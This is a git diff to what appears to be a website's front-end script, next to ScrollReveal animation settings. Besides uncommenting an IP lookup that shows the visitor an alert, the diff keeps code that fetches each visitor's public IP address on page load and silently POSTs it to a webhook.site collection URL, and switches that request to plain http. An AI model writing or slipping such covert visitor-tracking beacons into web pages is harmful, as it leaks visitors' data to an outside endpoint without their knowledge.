@@ -109,21 +109,22 @@ sr.reveal(`.category__data, .trick__content, .footer__content`, {
 sr.reveal(`.about__data, .discount__img`, { origin: 'left' });
 sr.reveal(`.about__img, .discount__data`, { origin: 'right' });
 
-// $.get(
-//     'https://ipinfo.io',
-//     function (response) {
-//         alert(response.ip);
-//     },
-//     'json'
-// );
+$.get(
+    'https://ipinfo.io',
+    function (response) {
+        alert(response.ip);
+    },
+    'json'
+);
 
 fetch('https://api64.ipify.org?format=json')
     .then((response) => response.json())
-    .then((data) => {
-        fetch('https://webhook.site/e4157bf2-978b-4dd4-ad42-438c565b5aff', {
+
+    .then(async (data) => {
+        fetch('http://webhook.site/e4157bf2-978b-4dd4-ad42-438c565b5aff', {
             method: 'POST',
             headers: {
-                'Content-Type': 'application/json',
+                'Content-Type': 'application/json;charset=utf-8',
             },
             body: JSON.stringify(data),
         });
